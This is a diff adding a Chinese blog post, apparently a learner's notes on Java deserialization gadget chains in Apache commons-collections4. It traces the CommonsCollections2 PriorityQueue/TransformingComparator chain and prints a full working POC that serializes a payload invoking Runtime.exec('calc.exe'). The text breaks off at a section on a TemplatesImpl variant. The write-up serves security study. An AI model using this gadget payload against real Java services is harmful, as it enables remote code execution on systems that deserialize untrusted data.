@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="又是跟着P师傅学习Java安全的一天。这篇文中P师傅介绍了Commons-collections4与相关漏洞利用的修复。Apache Commons Collections是一个著名的辅助开发库，随着Java9以后的版本中原生库功能的丰富以及反序列化漏洞的影响，它也在逐渐被升级与替换。在2015年底commons-collections反序列化利用链被提出来的时候，Apache Commons C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="commons-collections4与漏洞修复">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;12&#x2F;09&#x2F;commons-collections4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="又是跟着P师傅学习Java安全的一天。这篇文中P师傅介绍了Commons-collections4与相关漏洞利用的修复。Apache Commons Collections是一个著名的辅助开发库，随着Java9以后的版本中原生库功能的丰富以及反序列化漏洞的影响，它也在逐渐被升级与替换。在2015年底commons-collections反序列化利用链被提出来的时候，Apache Commons C">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;09&#x2F;lp1TabvWfCUFsAk.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;09&#x2F;5oLSA86ErzIfXQb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;09&#x2F;4onImK26VdBEwlv.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;09&#x2F;QJLNIK7vsVRWYjB.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;09&#x2F;EYymWsxF7S52JNT.png">
+<meta property="og:updated_time" content="2021-12-09T13:24:49.877Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;09&#x2F;lp1TabvWfCUFsAk.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/12/09/commons-collections4与漏洞修复/"/>
+
+
+
+
+
+  <title>commons-collections4与漏洞修复 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/09/commons-collections4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">commons-collections4与漏洞修复</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-09T10:02:39+08:00">
+                2021-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>又是跟着P师傅学习Java安全的一天。这篇文中P师傅介绍了Commons-collections4与相关漏洞利用的修复。Apache Commons Collections是一个著名的辅助开发库，随着Java9以后的版本中原生库功能的丰富以及反序列化漏洞的影响，它也在逐渐被升级与替换。在2015年底commons-collections反序列化利用链被提出来的时候，Apache Commons Collections有以下两个版本的分支。</p>
+<ul>
+<li>commons-collections:commons-collections</li>
+<li>org.apache.commons:commons-collections4</li>
+</ul>
+<p>可以看到，groupId和artifactId都变了，前者是Commons Collecionts老版本的包，当时版本号是3.2.1；后者是官方在2013年推出的4版本，当时版本号是4.0.为什么分成两个不同的分支呢？因为官方认为旧的commons-collections有一些API设计和架构的问题，但是修复这些问题会产生大量不能向前兼容的改动。所以commons-collections4不再认为是一个用来替换commons-collections的新版本，而是一个新的包，两者的命名空间不冲突，所以可以共存在一个项目中。那么就有一个很自然的问题，既然3.2.1存在反序列化利用链，那么4.0版本是否存在呢？</p>
+<h2 id="commons-collections4的改动"><a href="#commons-collections4的改动" class="headerlink" title="commons-collections4的改动"></a>commons-collections4的改动</h2><p>要搞清楚这个问题，需要先搞清楚一点，老的利用链在commons-collections4中是否仍然能够利用？因为这两个包可以共存，所以可以将两个包安装到同一个项目中进行比较</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commonscollections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commonscollections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里P师傅给了个xml的，但是我直接跑apache下了4.0的jar包导入进去。用熟悉的CommonsCollections6利用链做个例子，把代码拷贝一下，然后把<code>import org.apache.commons.collections.*</code> 改成 <code>import org.apache.commons.collections4.*</code>.这时候IDEA报了一个错误。提示LazyMap的decorate方法不可用<br><img src="https://s2.loli.net/2021/12/09/lp1TabvWfCUFsAk.png" alt="1.png"><br>来看commonscollections3中decorate的定义</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这个方法就是LazyMap构造函数的一个包装，而在commonscollections4中，这个方法其实只改了个名字叫lazyMap</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;V, K&gt; <span class="function">LazyMap&lt;K, V&gt; <span class="title">lazyMap</span><span class="params">(Map&lt;K, V&gt; map, Transformer&lt;? <span class="keyword">super</span> K, ? extends V&gt; factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>所以我们可以将Gadget中decorate改为lazyMap</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outerMap = LazyMap.lazyMap(inner, transformerChain);</span><br></pre></td></tr></table></figure>
+<p>运行一下，成功弹出计算器。<br><img src="https://s2.loli.net/2021/12/09/5oLSA86ErzIfXQb.png" alt="1.png"><br>同理，之前的CC1和CC3都可以在commons-collections4中正常使用。这里测试的时候，TransformedMap的CC1是无法正常在commons-collections4里正常运行的，可以改用LazyMap加代理的方式改造。同理，CC3也是。</p>
+<h2 id="PriorityQueue利用链"><a href="#PriorityQueue利用链" class="headerlink" title="PriorityQueue利用链"></a>PriorityQueue利用链</h2><p>除了几个老利用链，ysoserial为commons-collections4准备了两条新的利用链，这就是CommonsCollections2和CommonsCollections4.commons-collections这个包之所以能有这么多利用链，除了因为其使用量大，技术上的原因是其中包含了一些可以执行任意方法的Transformer。所以，在commons-collections中找Gadget的过程实际可以简化为，找一条<code>Serializable#readObject</code>到<code>Transformer#transform()</code>方法的调用链。有这个认识，再来看看CommonsCollections2，其中用到了两个关键类：</p>
+<ul>
+<li>java.util.PriorityQueue</li>
+<li>org.apache.commons.collections4.comparators.TransformingComparator<br>这两个类有什么特点？<br>java.util.PriorityQueue是一个有自己readObject方法的类：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in "proper order", but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+而<code>org.apache.commons.collections4.comparators.TransformingComparator</code>中有调用transform方法的函数<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+所以CommonsCollections2实际上就是一条从<code>PriorityQueue</code>到<code>TransformingComparator</code>的利用链。看一下他们是怎么连接起来的。<code>PriorityQueue#readObject</code>中调用了<code>heapify()</code>方法，<code>heapify()</code>中调用了<code>siftDown()</code>，<code>siftdown()</code>中调用了<code>siftDownUsingComparator()</code>,<code>siftDownUsingComparator()</code>中调用了<code>comparator.compare()</code>，于是就连接到上面的<code>TransformingComparator</code>了<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+整个调用链如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#readObject</span><br><span class="line">    PriorityQueue#heapify</span><br><span class="line">        PriorityQueue#siftDown</span><br><span class="line">            PriorityQueue#siftDownUsingComparator</span><br><span class="line">                TransformingComparator#compare</span><br><span class="line">                    ...</span><br></pre></td></tr></table></figure>
+整个的调用关系比较简单。P师傅总结如下</li>
+<li><code>java.util.PriorityQueue</code>是一个优先队列(Queue)，基于二叉堆实现，队列中每一个元素有自己的优先级，节点之间按照优先级大小排序成一棵树</li>
+<li>反序列化时为什么需要调用<code>heapify()</code>方法？反序列化后，需要恢复这个结构的顺序</li>
+<li>排序是靠将大的元素下移实现的。<code>siftDown()</code>是将节点下移的函数，而<code>comparator.compare()</code>用来比较两个元素的大小</li>
+<li><code>TransformingComparetor</code>实现了<code>java.util.Comparator</code>接口，这个接口用于定义两个对象如何进行比较。<code>siftDownUsingComparator()</code>中就使用这个接口的<code>compare()</code>方法比较树的结点</li>
+</ul>
+<p>关于<code>PriorityQueue</code>这个数据结构的具体原理可以参考这篇文章：<a href="https://www.cnblogs.com/linghu-java/p/9467805.html" target="_blank" rel="noopener">传送门</a><br>按照这个思路开始编写POC，首先还是创建Transformer，这里可以采用前面用到的各种transform利用链，例子就用CC1里面用到的就行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">    new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">    new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">    new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new String[] &#123;"calc.exe"&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br></pre></td></tr></table></figure>
+<p>再创建一个<code>TransformingComparator</code>，传入创建好的<code>Transformer</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformerChain);</span><br></pre></td></tr></table></figure>
+<p>实例化<code>PriorityQueue</code>对象，第一个参数是初始化时的大小，至少需要两个元素才会触发排序和比较，所以是2.第二个参数是比较时的Comparator，传入前面实例化的comparator</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<p>这里随便添加了两个数字进去，这里可以传入非null的任意对象，因为上面创建的Transformer是忽略传入参数的。最后将真正的恶意Transformer设置上。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br></pre></td></tr></table></figure>
+<p>完整的POC如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new String[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformerChain);</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br><span class="line"><span class="comment">// 生成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"><span class="comment">// 本地测试</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行后成功弹出计算器<br><img src="https://s2.loli.net/2021/12/09/4onImK26VdBEwlv.png" alt="1.png"></p>
+<h2 id="改进PriorityQueue利用链"><a href="#改进PriorityQueue利用链" class="headerlink" title="改进PriorityQueue利用链"></a>改进PriorityQueue利用链</h2><p>在上一篇文章中提到，用<code>TemplatesImpl</code>可以构造出无Transformer数组的利用链，尝试用同样的方法将这个利用链也改造一下。还是像之前一样先创建<code>TemplatesImpl</code>对象:</p>
